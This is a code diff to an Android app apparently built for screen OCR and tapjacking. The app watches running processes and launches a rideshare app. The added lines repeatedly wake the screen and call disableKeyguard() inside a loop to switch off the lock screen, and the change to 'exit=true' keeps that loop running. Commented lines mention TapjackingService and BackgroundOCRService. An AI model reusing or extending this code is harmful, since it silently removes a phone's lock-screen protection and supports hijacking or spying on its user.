@@ -1,6 +1,8 @@
 package net.rahar.screenshotocr;
 
+import android.app.Activity;
 import android.app.ActivityManager;
+import android.app.KeyguardManager;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -10,6 +12,7 @@ import android.media.MediaScannerConnection;
 import android.net.Uri;
 import android.os.Environment;
 import android.os.Looper;
+import android.os.PowerManager;
 import android.util.Log;
 import android.view.View;
 import android.widget.LinearLayout;
@@ -40,6 +43,17 @@ class ListenActivity extends Thread{
 
         Looper.prepare();
         while(!exit){
+
+            PowerManager pm=(PowerManager) context.getSystemService(Context.POWER_SERVICE);
+            PowerManager.WakeLock wl=pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.SCREEN_BRIGHT_WAKE_LOCK, "My Tag");
+            wl.acquire();
+            wl.release();
+
+            KeyguardManager keyguardManager = (KeyguardManager) context.getSystemService(Activity.KEYGUARD_SERVICE);
+            KeyguardManager.KeyguardLock lock=keyguardManager.newKeyguardLock(Activity.KEYGUARD_SERVICE);
+            lock.disableKeyguard();
+
+            
             int currentapiVersion = android.os.Build.VERSION.SDK_INT;
             List<AndroidAppProcess> processes = ProcessManager.getRunningAppProcesses();
             for (AndroidAppProcess process:processes) {
@@ -55,7 +69,7 @@ class ListenActivity extends Thread{
                     Intent intent = context.getPackageManager().getLaunchIntentForPackage("com.rideshare.eugene.face_rideshare");
                     context.startActivity(intent);
                     flag=1;
-                    exit=true;
+                    //exit=true;
                     //context.startService(new Intent(TapjackingService.class.getName()));
                     //context.startService(new Intent(BackgroundOCRService.class.getName()));
                 }
